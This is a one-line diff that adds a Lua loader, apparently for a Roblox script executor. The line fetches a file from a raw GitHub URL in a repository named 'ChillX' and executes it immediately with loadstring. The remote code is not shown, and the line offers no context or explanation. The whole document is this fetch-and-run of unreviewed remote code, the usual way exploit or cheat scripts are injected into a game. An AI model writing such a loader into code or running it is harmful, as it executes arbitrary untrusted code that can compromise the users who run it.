@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/hodrich/ChillX/main/77_CI6WT9JHY7.lua'))()
